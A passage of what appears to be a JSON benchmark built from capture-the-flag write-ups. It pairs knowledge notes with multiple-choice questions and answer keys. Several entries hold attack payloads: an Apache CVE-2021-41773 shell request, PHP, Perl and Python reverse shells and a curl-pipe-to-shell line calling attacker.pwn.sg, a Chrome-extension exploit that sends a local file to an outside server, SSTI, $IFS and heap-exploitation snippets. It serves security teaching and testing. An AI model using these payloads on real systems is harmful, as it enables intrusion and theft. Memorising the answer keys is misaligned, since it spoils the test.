            "The presence of the X-XSS-Protection header with the value `1; mode=block` can be bypassed by altering the encoding of injected scripts. Changing the encoding circumvents the XSS Auditor in browsers like Chrome by exploiting how the browser interprets character encodings. Using a Byte Order Mark (BOM) to change the encoding to UTF-16 or a similar encoding can prevent the XSS Auditor from recognizing and blocking reflected XSS payloads.\n   - Example payload: (Represented in hexadecimal for UTF-16LE encoding bypass)\n       ```\n       00000000: ff fe 31 00 3c 00 73 00 63 00 72 00 69 00 70 00  ..1.<.s.c.r.i.p.\n       00000010: 74 00 3e 00 61 00 6c 00 65 00 72 00 74 00 28 00  t.>.a.l.e.r.t.(.\n       00000020: 31 00 29 00 3c 00 2f 00 73 00 63 00 72 00 69 00  1.).<./.s.c.r.i.\n       00000030: 70 00 74 00 3e 00                                p.t.>.\n       ```"
        ],
        "question": [
            "Given a web page that implements CSP with the following policy: `default-src 'self'; object-src 'none'; base-uri 'none';`, which technique could allow for the execution of unauthorized JavaScript if the application accepts user input for API callbacks?  - A. Adding a `<meta>` tag to modify the CSP to allow all sources. - B. Utilizing an iframe to load a malicious page from another domain. - C. Injecting a script tag pointing to an external JavaScript file not hosted on the same domain. - D. Reincluding the application's API with a malicious callback, leveraging the same-domain policy of CPS. ",
            "When trying to bypass the `X-XSS-Protection` header set to `1; mode=block` via script encoding methods, which encoding alteration is effective in preventing the XSS Auditor in modern browsers from recognizing and blocking reflected XSS payloads?  - A. Changing the script encoding to ASCII by prepending a specific ASCII character. - B. Adding a Byte Order Mark (BOM) for UTF-16LE at the beginning of the injected script. - C. Modifying the Content-Type header of the response to `text/plain`. - D. Encoding the payload in Base64 to obfuscate the malicious script. "
        ],
        "answer": [
            "D",
            "B"
        ]
    },
    {
        "name": "Health Portal",
        "write_up": "dataset/raw/Health Portal.md",
        "type": "misc",
        "competition": [
            "VULNCON/2021",
            "https://ctftime.org/event/1469/tasks/"
        ],
        "score": 470,
        "max_score": 472,
        "difficulty": 0.9957627118644068,
        "knowledge": [
            "When encountering a server with a known vulnerability, such as Apache/2.4.49 (Debian) being susceptible to CVE-2021-41773, a directory traversal attack can be performed to achieve remote code execution. This is accomplished by manipulating the URL to traverse to the directory where executable binaries are located, such as `/bin/sh` for shell access. The exploitability is confirmed by issuing a crafted HTTP request that includes directory traversal sequences (e.g., `/.%2e/.%2e/.%2e/.%2e/`) in the path to bypass restrictions and execute arbitrary commands.\n   - Example payload: `GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1`",
            "In scenarios where direct command execution is restricted or limited by the environment, a reverse shell can be established to gain more stable and interactive shell access. This is particularly useful in containerized environments where tools and commands may be limited. By sending a specially crafted payload that instructs the server to initiate a connection back to an attacker-controlled machine, one can execute arbitrary commands with the privileges of the web server user. Using languages like PHP in the payload can facilitate this reverse shell initiation.\n   - Example payload: `echo;php -r '$sock=fsockopen(\"attacker.pwn.sg\",1337);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'`"
        ],
        "question": [
            "In the context of exploiting CVE-2021-41773 in Apache/2.4.49 for a directory traversal attack, which of the following HTTP request paths correctly demonstrates how to achieve remote code execution by accessing the shell in a vulnerable server setup? - A. GET /cgi-bin/bin/sh HTTP/1.1 - B. GET /../../../../bin/sh HTTP/1.1 - C. GET /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1 - D. POST /usr/bin/sh HTTP/1.1",
            "In a situation where direct execution tools are limited within a container, which of the following payloads correctly depicts how to establish a reverse shell by exploiting the PHP environment to connect back to an attacker's machine? - A. echo;perl -e 'use Socket;$i=\"attacker.pwn.sg\";$p=1337;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};' - B. echo;python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.pwn.sg\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' - C. curl http://attacker.pwn.sg:1337 | sh - D. echo;php -r '$sock=fsockopen(\"attacker.pwn.sg\",1337);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'"
        ],
        "answer": [
            "C.",
            "D."
        ]
    },
    {
        "name": "heap-2022",
        "write_up": "dataset/raw/heap-2022.md",
        "type": "reverse",
        "competition": [
            "Aero/2022",
            "https://ctftime.org/event/1659/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "For exploiting Use-After-Free (UAF) vulnerabilities, especially in C programming, ensure to set any pointer to `NULL` after freeing it to prevent dangling pointers which can lead to UAF bugs. This principle is crucial for secure coding practices and avoiding vulnerabilities in memory management.",
            "When dealing with modern versions of GLIBC (e.g., version 2.34 and above) where traditional exploitation techniques like hooking `__malloc_hook`, `__free_hook`, or `__realloc_hook` are not viable due to security enhancements, pivot towards exploiting structures like `__exit_funcs` for arbitrary code execution. This requires understanding of internal structures and pointer encryption/decryption in GLIBC, illustrating the necessity of adaptability in exploitation techniques amidst evolving security measures.\n   \nExample Payload Snippet for `__exit_funcs` manipulation:\n```python\n# For encryption of function pointers due to GLIBC security measures\ndef encrypt(v, key):  \n   return p64(rol(v ^ key, 0x11, 64))\n   \n# Crafting a payload to overwrite __exit_funcs entry with system()\nonexit_fun = p64(0) + p64(1) + p64(4) + encrypt(libc.sym['system'], key) + p64(heap + 0x2c0) + p64(0)\nadd(onexit_fun)\n```\nThis strategy involves creating a controlled structure on the heap, identifying and exploiting a write-what-where condition to overwrite an exit function pointer (`__exit_funcs`) with a pointer to a desirable function (`system()`), alongside crafting arguments to achieve arbitrary code execution upon program exit."
        ],
        "question": [
            "In a C program handling dynamic memory for a custom chunk management system, a developer implements a function to delete these chunks. After freeing a chunk's data pointer (`free(chunk->ptr)`), they correctly nullify the pointer (`chunk->ptr = NULL`) but neglect to do the same for the chunk's main structure in the array keeping track of all chunks. Which of the following best completes the implementation to prevent Use-After-Free (UAF) vulnerabilities related to the `chunks` array? - A. Set `chunk->size` and `chunk->used` to `0` after freeing the data pointer. - B. Immediately call `malloc(sizeof(chunk_t))` to reallocate the chunk memory right after calling `free(chunks[chunk_id])`. - C. After freeing the chunk (`free(chunks[chunk_id])`), set `chunks[chunk_id] = NULL`. - D. Reset all members of the `chunk` to their initial values instead of setting the pointer to `NULL`. ",
            "When attempting to exploit a heap-based buffer overflow in a binary linked against a modern version of GLIBC (2.34 and above), traditional hooks like `__malloc_hook`, `__free_hook`, and `__realloc_hook` are unavailable due to security hardening efforts. Given this scenario, which technique is now a viable alternative for achieving arbitrary code execution? - A. Overwrite the `__stack_chk_fail` hook to bypass stack canaries. - B. Manipulate the `__exit_funcs` structure to execute a chain of crafted function pointers on program exit. - C. Use format string vulnerabilities to directly alter the GOT. - D. Hook into the `__start_main` function to redirect execution at the beginning of the program. "
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "heapmailer",
        "write_up": "dataset/raw/heapmailer.md",
        "type": "reverse",
        "competition": [
            "BalCCon/2020",
            "https://ctftime.org/event/1100/tasks/"
        ],
        "score": 497,
        "max_score": 497,
        "difficulty": 1.0,
        "knowledge": [
            "To exploit a use-after-free vulnerability in a scenario where an application does not clear a pointer after freeing associated memory, an attacker can trigger the vulnerability to control the data being pointed to by the dangling pointer. This can be achieved by allocating a new chunk of memory in the place of the previously freed one, potentially allowing arbitrary read/write operations or control flow hijack. In the provided use-after-free case, the user's identity change operation frees the current identity without nullifying the pointer. Exploiting such vulnerabilities typically involves steps to first free a chunk of memory (triggering the use-after-free condition) and then strategically placing controlled data in the memory location that the freed (now dangling) pointer points to.",
            "To exploit base64 decoding vulnerabilities that improperly handle the size of the decoded output, an attacker can pad the encoded data in such a way that the result of the size miscalculation causes a buffer overflow or allows unintended memory modification. This technique was showcased by manipulating the chunk size calculations related to base64-decoded content. The attacker can supply base64-encoded data that, when decoded, will have its size improperly calculated (due to the lack of proper padding handling) to overwrite adjacent memory structures. In the demonstrated vulnerability, this miscalculation leads to buffer overflows that can be leveraged to overwrite important data structures, such as function pointers or command buffers, with attacker-controlled data.\n\nExample payload for exploiting base64 decoding vulnerability:\n```php\nprintf(\"[+] Corrupt size\\n\");\n$payload = str_repeat(\"\\x00\", 0x48) . pack(\"v\", SIZE | 1);\n$payload = rtrim(base64_encode($payload), \"=\");\nchnk($t, $payload);\n```"
        ],
        "question": [
            "In a scenario where a security vulnerability arises due to a use-after-free error when the program fails to set a pointer to null after freeing, what technique should an attacker use to exploit this vulnerability effectively? - A. Allocate memory with a different size to avoid reallocation at the same address. - B. Avoid manipulating the freed memory to prevent corruption. - C. Overwrite the freed memory with arbitrary data before it's reallocated. - D. Wait for the program to allocate more memory to trigger automatic reallocation. ",
            "Given a vulnerability in the handling of base64 decoding that leads to buffer overflows due to size miscalculations, what method can an attacker use to exploit it based on the provided base64 decoding error scenario? - A. Encode data with base64 without padding and supply as input. - B. Correctly pad the base64 data to prevent size miscalculation. - C. Use regular expressions to preprocess the base64 data before sending. - D. Supply oversized base64-encoded data that does not require decoding. "
        ],
        "answer": [
            "C",
            "A"
        ]
    },
    {
        "name": "Heisenberg's Password",
        "write_up": "dataset/raw/Heisenberg's Password.md",
        "type": "forensics",
        "competition": [
            "BSidesDelhi/2020",
            "https://ctftime.org/event/1158/tasks/"
        ],
        "score": 895,
        "max_score": 1000,
        "difficulty": 0.895,
        "knowledge": [
            "When faced with a memory forensics challenge, Volatility can be used to identify the operating system of a memory dump by analyzing the KDBG structure. This process helps in understanding the memory model and obtaining system information critical for further analysis. The `imageinfo` plugin in Volatility provides such details, which include the suggested profile for the dump, operating system version, service pack, system architecture (32-bit vs 64-bit), and date and time of the image. This step is crucial for setting the appropriate profile for analyzing the dump.",
            "To find the last modified date of a file within a Windows memory dump, the `mftparser` plugin in Volatility can be utilized. The master file table (MFT) contains metadata about each file on the NTFS file system, including file sizes, timestamps (creation, modification), permissions, and data content. By parsing the MFT, one can extract valuable information about file transactions, which is useful in forensics investigations to track file activities and potentially uncover evidence. \n\nFor instance, to find the last modified date of `loveyou.png`, use the following command:\n```\npython vol.py -f [path_to_memory_dump] --profile=[appropriate_profile] mftparser | grep \"loveyou.png\"\n```\nThis command filters the results to show entries related to `loveyou.png`, allowing one to identify the modification timestamp."
        ],
        "question": [
            "When needing to identify the Windows version of a memory dump file for forensic analysis, which Volatility plugin would you use to obtain information such as operating system version, service pack, and architecture? - A. cmdline - B. chromehistory - C. filescan - D. imageinfo",
            "You are tasked with finding the last modified date of a file named `report.docx` in a memory dump from a Windows PC. Which Volatility plugin and command format should you use to extract this information? - A. python vol.py -f [memory_dump_path] --profile=[profile] cmdline | grep \"report.docx\" - B. python vol.py -f [memory_dump_path] --profile=[profile] chromehistory | grep \"report.docx\" - C. python vol.py -f [memory_dump_path] --profile=[profile] mftparser | grep \"report.docx\" - D. python vol.py -f [memory_dump_path] --profile=[profile] filescan | grep \"report.docx\""
        ],
        "answer": [
            "D",
            "C"
        ]
    },
    {
        "name": "Helliptic",
        "write_up": "dataset/raw/Helliptic.md",
        "type": "crypto",
        "competition": [
            "LedgerDonjon/2021",
            "https://ctftime.org/event/1516/tasks/"
        ],
        "score": 250,
        "max_score": 400,
        "difficulty": 0.625,
        "knowledge": [
            "When exploiting vulnerable elliptic curve implementations, one effective strategy is the use of twist attacks on servers using specific curves like secp256k1. To perform this, attackers can register a public key with a small order on a curve that is isogenous (similar in structure) to the server's curve. This process can yield a limited set of possible shared secrets between a server and attacker, thereby reducing the encryption key space to a manageable brute-force attack. This method relies on the server's failure to validate public keys properly, allowing the submission of keys that do not belong to the curve but to a twisted curve with weak properties. \n\n    - Condition: This strategy is applicable in situations where a server performs key exchanges using elliptic curves without properly validating that public keys submitted by clients indeed belong to the expected curve. This can often be leveraged in scenarios where elliptic curve cryptography (ECC) is used for securing communications, like TLS.\n\n    - Knowledge: Generate a public key on a twisted curve with a small order and use it to interact with the target server, exploiting the weak elliptic curve to decrypt or forge messages. By creating a public key that the server believes belongs to a legitimate curve, an attacker can manipulate the ECDH (Elliptic Curve Diffie-Hellman) exchange, leading to predictable and limited results when the server calculates the shared secret. This dramatically simplifies the process of decrypting intercepted encrypted messages or impersonating a user.",
            "To recover encrypted messages using the invalid curve method, one can employ a series of modulus operations using the Chinese Remainder Theorem (CRT) to combine results from multiple interactions with the server. This involves crafting specific public keys to create predictable shared secrets, decrypting responses from the server, and using the CRT to solve for the unknown private key.\n\n    - Condition: This approach is particularly useful in scenarios involving end-to-end encrypted messages where one party's private key is compromised or inferred. The technique relies on being able to interact with the server using specially crafted public keys that result in a predictable or limited set of possible encryption keys.\n\n    - Knowledge: Once the attacker has a set of possible encryption keys from interacting with the server using invalid curve points, the CRT can be applied to find a solution that matches the encryption key used in the communication with the victim. This solution provides a way to decrypt messages that were previously assumed secure due to the cryptographic properties of ECC."
        ],
        "question": [
            "An attacker identifies a server that does not validate client-provided elliptic curve public keys during key exchange. Which of the following strategies should be used to exploit this vulnerability effectively? - A. Generate a public key using a well-known, strong elliptic curve such as secp256r1 and submit it to the server. - B. Submit a series of random public keys to the server until one is accepted that allows the decryption of encrypted messages. - C. Generate a public key on a twisted curve with a small order and use it to interact with the target server, thereby exploiting the weak elliptic curve. - D. Use a public key from a high-order curve that is not supported by the server in hopes of causing a server error that leaks information. ",
            "In the context of exploiting elliptic curve cryptography through invalid curve attacks and recovering encrypted messages, what method can be applied after obtaining a set of possible shared secrets from interactions with the target server? - A. Apply a simple brute force attack with each possible shared secret to decrypt the messages directly. - B. Use the Chinese Remainder Theorem (CRT) to combine results from interactions with the server and solve for the unknown private key. - C. Implement the Diffie-Hellman key exchange with the obtained shared secrets to generate a new set of encryption keys. - D. Convert the shared secrets into elliptic curve public keys and submit them back to the server as part of a replay attack. "
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "HelloWorld",
        "write_up": "dataset/raw/HelloWorld.md",
        "type": "This write-up describes a reverse engineering (reverse) challenge.",
        "competition": [
            "DarkCTF/2020",
            "https://ctftime.org/event/1118/tasks/"
        ],
        "score": 298,
        "max_score": 499,
        "difficulty": 0.5971943887775552,
        "knowledge": [
            "In binary reverse engineering challenges, using tools like Ghidra for decompilation can provide insights into the program's logic, such as conditional checks and argument verification routines. This knowledge can guide where to set breakpoints in a debugger, like GDB, for dynamic analysis. Specifically, look for calls to comparison functions (e.g., `strcmp`) that could be involved in argument validation to identify expected input values.",
            "When dealing with binary programs that expect certain arguments, using GDB to set breakpoints on comparison instruction calls (`strcmp` in this case) and examining the values of registers involved (e.g., `rsi` and `rdi` in x86_64 architecture) can reveal the expected argument values. This method can be particularly effective when source code is not available, and static analysis alone does not yield clear insights into required input values for successful execution.\n\nExample GDB commands to set breakpoints and examine registers:\n```\n(gdb) break *<address_of_strcmp>\n(gdb) run <arg1> <arg2>\n(gdb) info registers rsi rdi\n```"
        ],
        "question": [
            "In the context of reverse engineering a binary challenge, why might a security researcher use a tool like Ghidra before executing the binary with GDB? - A. To compile the source code to a different language for easier understanding. - B. To find variable names that are used in runtime for dynamic memory allocation. - C. To identify function calls and logic, such as `strcmp` for argument verification, to guide where to set breakpoints in GDB. - D. To modify the binary directly to bypass security checks without understanding the program logic.",
            "When analyzing a binary program with GDB to find out the correct arguments for successful execution, which of the following GDB commands sequence is most appropriate to reveal expected argument values through comparison functions like `strcmp`? - A. `(gdb) disassemble main` followed by `(gdb) watch <variable_name>` - B. `(gdb) break *<address_of_strcmp>` followed by `(gdb) run <arg1> <arg2>` and `(gdb) info registers rsi rdi` - C. `(gdb) jump *<address_of_main>` followed by `(gdb) continue` - D. `(gdb) info functions` followed by `(gdb) print <function_name>`"
        ],
        "answer": [
            "C",
            "B"
        ]
    },
    {
        "name": "Help Mars!",
        "write_up": "dataset/raw/Help Mars!.md",
        "type": "This challenge falls under the category of **misc** (Miscellaneous) for CTF (Capture The Flag) competitions.",
        "competition": [
            "CTFZone/2018/Quals",
            "https://ctftime.org/event/632/tasks/"
        ],
        "score": 141,
        "max_score": 500,
        "difficulty": 0.282,
        "knowledge": [
            "When encountering challenges requiring the search for specific sequences or combinations within a large dataset, a dynamic programming approach can efficiently reduce computation time. This method involves breaking down the problem into smaller, manageable subproblems, solving each subproblem just once, and storing their solutions - ideally in a hash map for quick access. By caching these results, the algorithm avoids redundant calculations, speeding up the process significantly. This approach is especially effective in scenarios where the problem can be divided into overlapping subproblems, allowing for the optimization of both time and space complexity.",
            "For challenges involving the synthesis or construction of a specific target from a set of given elements (such as sequences, numbers, or strings), iterative comparison and selection can be applied. Starting from the beginning of the target, iteratively search for the available elements that can construct the target, ensuring at each step to choose the element that keeps the solution optimal (e.g., shortest in length, minimal in number, or another defined criteria). The decision at each step considers both the immediate impact (choosing the current best fit) and the long-term outcome (ensuring the overall solution remains optimal). This process may involve checking the existence of the current segment in a predefined set or map, and recursively continuing the process with the remaining part of the target. \n\nExample Payload:\n```python  \ndef solve(target, samples):\n    sample_to_ind = {sample: i for i, sample in enumerate(samples)}\n    max_sample_len = max(len(sample) for sample in samples)\n\n    def find_min_combination(suffix):\n        if not suffix:\n            return []\n        best = None\n        for i in range(1, min(max_sample_len, len(suffix)) + 1):\n            if suffix[:i] not in sample_to_ind:\n                continue\n            current = find_min_combination(suffix[i:])\n            if current is not None and (best is None or len(current) < len(best)):\n                best = [sample_to_ind[suffix[:i]]] + current\n        return best\n\n    return find_min_combination(target)\n```"
        ],
        "question": [
            "When implementing a dynamic programming approach to solve a problem involving finding specific sequences within a large dataset, how important is the use of caching to enhance the algorithm's efficiency? - A. It changes the algorithm from polynomial to logarithmic complexity. - B. Not important, as dynamic programming does not rely on caching for speed improvements. - C. Crucial, because it avoids redundant calculations by storing subproblem solutions, reducing overall computation time. - D. It increases the memory usage without significantly affecting the computation time.",
            "In a problem where you need to construct a specific target from a given set of elements, which strategy best describes the process of iteratively selecting elements to form an optimal solution? - A. Always choosing the largest possible element to minimize the number of elements used. - B. Randomly selecting an available element and then backtracking if the target cannot be completely formed. - C. Starting from the beginning of the target, iteratively search for elements that can construct the target, ensuring the solution remains optimal by choosing the current best fit at each step. - D. Sorting the elements in descending order of their length and trying to match the target from the start."
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "Hey Buddy!",
        "write_up": "dataset/raw/Hey Buddy!.md",
        "type": "web",
        "competition": [
            "vishwa/2022",
            "https://ctftime.org/event/1548/tasks/"
        ],
        "score": 250,
        "max_score": 500,
        "difficulty": 0.5,
        "knowledge": [
            "When dealing with Server Side Template Injection (SSTI) vulnerabilities, particularly in applications built with the Flask framework, exploring the application's environment can reveal useful objects and methods that can be abused to execute arbitrary commands. This exploration can include invoking methods from the Flask `config` object to access Python's built-in objects and functions, thereby leading to information disclosure or remote code execution. This approach is effective in environments where the application server has access to Python's standard libraries and the underlying operating system's command line interface.",
            "In scenarios where command execution is limited by web application filtering mechanisms that restrict the use of spaces or certain characters in commands, the Internal Field Separator (`$IFS`) can be used as an alternative to bypass these restrictions. The `$IFS` character in Linux and UNIX environments allows for the separation of command arguments where spaces would normally be used, enabling the execution of commands that require arguments. This technique is particularly useful in web security contexts where traditional command injection payloads are filtered or blocked.\n   \n   Example payload: `cat${IFS}flag.txt`"
        ],
        "question": [
            "In testing for Server Side Template Injection (SSTI) vulnerabilities on a website running the Flask framework, an attacker discovered the ability to access Python's built-in objects and execute arbitrary commands via the application's server. Which of the following payloads best demonstrates how an attacker can leverage the Flask `config` object to read files from the server? - A. `{{config.items()}}` - B. `{{request.application.globals}}` - C. `{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}` - D. `{{session.exec('id')}}` ",
            "In an environment where a web application\u2019s input filtering mechanism blocks the use of space characters in user input, an attacker needs to run the command `cat flag.txt`. The application is hosted on a Linux server. Which of the following payloads correctly demonstrates the use of the Internal Field Separator (`$IFS`) to bypass the space restriction and execute the desired command? - A. `cat$IFSflag.txt` - B. `cat+%20flag.txt` - C. `cat\\ flag.txt` - D. `cat@flag.txt` "
        ],
        "answer": [
            "C.",
            "A."
        ]
    },
    {
        "name": "hide and split 100",
        "write_up": "dataset/raw/hide and split 100.md",
        "type": "This is a **forensics** challenge.",
        "competition": [
            "TCP1P-CTF/2023",
            "https://ctftime.org/event/2001/tasks/"
        ],
        "score": -1,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When analyzing disk images for hidden data, using tools like `strings` combined with `egrep` can help to extract hexadecimal strings that may not be immediately obvious. This is particularly useful when looking for data hidden within the file system that doesn't conform to standard file entries. For files suspected to be images, especially those starting with known magic numbers (e.g., `89 50 4e` for PNG files), this method can extract the data directly from the disk image without needing to mount or explore the file system interactively. This approach relies on the recognition of file signatures and the assumption that the content of interest is encoded in hexadecimal format accessible through direct string extraction.\n   - Example command: `strings challenge.ntfs | egrep -o '^(?:[0-9a-f]){16,}$'`",
            "For files that have been split and hidden across different parts of a disk image, especially when indicated by file names or contents pointing to this fragmentation (like flag-[number].txt files suggesting the flag is scattered), consolidating all hexadecimal fragments from these split files and converting them back into their original format (e.g., an image) can reveal hidden messages or data. Tools like CyberChef facilitate the conversion from hexadecimal to the file's intended format, enabling the visualization of QR codes or other embedded information within seemingly unrelated or fragmented hex data pieces.\n   - Example process: Concatenate all hexadecimal strings from fragmented files into a single text file, use CyberChef (or a similar tool) to convert from hex to binary or the original file format, revealing the hidden data."
        ],
        "question": [
            "When looking to extract potential hidden image data from a disk image file using the `strings` and `egrep` commands, what regular expression is best suited to select hexadecimal strings that could represent an image file? - A. `egrep -o '^(?:[0-9a-fA-F]){2,}$'` - B. `egrep -o '^(?:[0-9a-f]){16,}$'` - C. `egrep -o '^[a-f0-9]+$'` - D. `egrep -o '[0-9a-f]{2,}'`",
            "In a scenario where you have a set of text files named flag-[number].txt, each containing a fragment of hexadecimal data meant to be concatenated to form an image, what is the crucial next step after gathering all hexadecimal strings into one file for revealing the hidden message? - A. Convert the hexadecimal text into binary using a programming language. - B. Use a file converter to change the file extension directly to .png. - C. Upload the concatenated file to an online hex editor and manually format it. - D. Utilize CyberChef (or a similar tool) to convert the concatenated hexadecimal strings from hex to the original file format to reveal the hidden data."
        ],
        "answer": [
            "B.",
            "D."
        ]
    },
    {
        "name": "Highlighter",
        "write_up": "dataset/raw/Highlighter.md",
        "type": "web",
        "competition": [
            "Defenit/2020",
            "https://ctftime.org/event/1060/tasks/"
        ],
        "score": 857,
        "max_score": 906,
        "difficulty": 0.9459161147902869,
        "knowledge": [
            "When dealing with `static-eval` in a Chrome extension's JavaScript, exploiting prototype pollution is a valid tactic to bypass sandbox restrictions. This can be achieved by overwriting JavaScript native object prototypes, such as `String.split`. This technique allows for the execution of arbitrary code within the constraints of the Chrome extension's permissions.    \n   Example payload to exploit prototype pollution and execute arbitrary code:  \n   ```\n   http://highlighter.ctf.defenit.kr/read?id=84#''['__proto__']['__defineGetter__']('split',function(){return/**/function(x){return/**/{[alert(1)]:1}};});\n   ```",
            "Chrome extensions with permissions over local files (`file://*/*`) can be exploited to read local files without cross-origin restrictions. Initially, identifying the directory structure by fetching `file:///` to receive the root directory listing, followed by targeting specific files, allows for unauthorized access to file contents. This strategy is especially applicable in scenarios where the exact location of sensitive files (like a flag) is unknown prior to exploitation.  \n   Example payload to fetch local files and send their contents to an attacker-controlled server:\n   ```\n   http://highlighter.ctf.defenit.kr/read?id=2#''['__proto__']['__defineGetter__']('split',function(){return/**/function(x){return/**/{[(function(){var/**/r=new/**/XMLHttpRequest();r.open('GET','file:///6339e914b333b35d902a2dfd2c415656/flag',false);r.send();r.responseText;fetch('http://{our server}/'+btoa(r.responseText));})()]:1,'zxcv':'1'}};})\n   ```"
        ],
        "question": [
            "In the context of a Chrome extension utilizing `static-eval`, which of the following techniques can be used to exploit prototype pollution for executing arbitrary JavaScript code? - A. Overwriting the `Array.join` method to intercept array operations. - B. Modifying the `Document.prototype` to alter document behaviors. - C. Overwriting the `String.split` method to execute arbitrary code during string operations. - D. Changing the `Object.prototype` properties to disable security checks. ",
            "For a Chrome extension with access to `file://*/*`, which method allows an attacker to exploit this permission to read local files without cross-origin restrictions? - A. Sending a request to `http://*/*` to bypass the same-origin policy. - B. Exploiting `document.domain` property to include local files in the extension's context. - C. Fetching `file:///` first to list directory contents, then targeting specific files to read their contents. - D. Using `localStorage` to store and later retrieve file paths for local files. "
        ],
        "answer": [
            "C",
            "C"
        ]
    },
    {
        "name": "History",
        "write_up": "dataset/raw/History.md",
        "type": "misc",
        "competition": [
            "0xL4ugh/2024",
            "https://ctftime.org/event/2216/tasks/"
        ],
        "score": -1.0,
        "max_score": -1,
        "difficulty": -1,
        "knowledge": [
            "When dealing with CTF challenges that require identifying subjects through multimedia content or obscure knowledge, an effective strategy is to cross-reference and search for specific elements or details represented in the content across various sources. This can involve using search engines, looking into Wikipedia pages for key details, or employing apps like Shazam to identify music. Additionally, considering alternative names or related concepts not directly provided but linked to the subject (like the *Theseus Maze by Claude Shannon* for Claude Shannon) can lead to the correct answer.",
            "In challenges that involve data extraction from files, such as analyzing archives or documents, using tools like `binwalk` to inspect and extract embedded or hidden content might be instrumental. When dealing with data compiled or stored based on older or specific architecture (like MS-DOS in the example), it's crucial to adjust your data extraction or string search methodologies to match the encoding or structure (e.g., using `-el` with `strings` for 16bits little endian data). This highlights the importance of considering the technical context and file system quirks when approaching data forensics tasks."
        ],
        "question": [
            "When tackling a CTF challenge that involves recognizing characters from multimedia sources, the player encountered an image of a device named \"*Theseus Maze by Claude Shannon*\" that initially didn\u2019t match the expected answer \"Claude Shannon.\" This scenario highlights which strategy for identifying obscure subjects through multimedia content? - A. Focusing solely on the most prominent figures in technology and their inventions. - B. Using social media to ask for help from friends or followers. - C. Cross-referencing details found in the challenge with information on Wikipedia and other sources to discover alternative names or related concepts. - D. Limiting the search to traditional search engines without considering alternative sources or tools. ",
            "In a CTF challenge focusing on data extraction from an archive which reveals itself to be a binary file with headers indicating it was for an MS-DOS system. Based on this context, the solution involved adjusting the string search methodology to align with the file's encoding system. Which command correctly matches the approach for extracting strings from 16bit little endian structured data within the file? - A. `strings -a J` - B. `strings -el J` - C. `grep 'pattern' J` - D. `cat J | hexdump -C` "
        ],
        "answer": [
            "C.",
            "B."
        ]
    },
    {
        "name": "Hmmm",
        "write_up": "dataset/raw/Hmmm.md",
        "type": "misc",
        "competition": [
            "HexionCTF/2020",
            "https://ctftime.org/event/1014/tasks/"
        ],
        "score": 453,
        "max_score": 998,
        "difficulty": 0.45390781563126253,
        "knowledge": [
            "When analyzing an ELF binary that does not exhibit any useful strings or does not seem to behave as expected when executed, it is important to inspect the binary at a byte level using tools like `hexdump` (hd) or `xxd`. This technique can reveal hidden data, such as flags, that may be obfuscated by non-printable characters such as NULL bytes inserted between the visible characters of the data.",
            "In scenarios where a binary file's behavior or output does not directly reveal clues towards solving a challenge, consider alternative methods of interactively examining the file's contents, such as using `cat` or examining the file's structure with file manipulation tools. This approach can unexpectedly expose embedded data or clues that were not apparent through dynamic analysis or disassembly. It's particularly useful when the flag or other critical data is stored in a non-standard format or is cleverly concealed within the binary's data sections."
        ],
        "question": [
            "When you suspect a binary file contains hidden data due to its non-standard behavior and conventional analysis tools like `strings` don't help, which command would be an effective choice to inspect the binary at a byte level and possibly reveal obfuscated data?  - A. `grep 'hidden' binaryfile` - B. `hexdump -C binaryfile` - C. `tail -f binaryfile` - D. `chmod +x binaryfile` ",
            "Given a situation where running or reverse-engineering a binary file does not straightforwardly disclose any useful information for a CTF challenge, which unconventional approach might unveil hidden data or flags inside the binary?  - A. `rm -rf binaryfile` - B. `gcc -o binaryfile` - C. `cat binaryfile` - D. `mkdir binarydata` "
        ],
        "answer": [
            "B",
            "C"
        ]
    },
    {
        "name": "Hobbit",
        "write_up": "dataset/raw/Hobbit.md",
        "type": "forensics",
        "competition": [
            "zer0pts/2020",
            "https://ctftime.org/event/1006/tasks/"
        ],
        "score": 525,
        "max_score": 755,
        "difficulty": 0.695364238410596,
        "knowledge": [
            "When reversing kernel modules or binaries proves to be too challenging or inaccessible due to environment constraints, consider utilizing memory dumping techniques. Running the target software in an emulated environment like QEMU and then dumping the memory with tools such as `gcore` can transition the challenge from reverse engineering to a forensics task. This approach allows for analysis of the program's runtime data, which can be particularly beneficial when direct debugging or code analysis is complicated or impractical.",
            "For Capture The Flag challenges where the flag is known to be loaded into memory at some point during execution, and if the binary or the execution environment outputs identifiable strings related to the flag, memory dump analysis can be extremely effective. After obtaining a memory dump, one can utilize string search tools or commands (e.g., grep) to find unique identifiers like \"FLAG:\" within the dump. This method can reveal the flag or critical parts of the binary or data that are being manipulated at runtime without needing to fully understand or reverse-engineer the program's logic.\n   - Example command to search in memory dump: `grep 'FLAG:' memdump.bin`"
        ],
        "question": [
            "In a scenario where reverse-engineering a kernel module or binary is complicated by the execution environment or other challenges, which alternative approach could streamline the debugging or analysis process by focusing on runtime data? - A. Decompiling the binary to source code and analyzing the algorithm. - B. Monitoring network traffic to intercept data exchanges between the binary and other system components. - C. Running the binary in an emulated environment such as QEMU and dumping the memory for later analysis. - D. Using static analysis tools to perform a high-level overview of the binary's functionality. ",
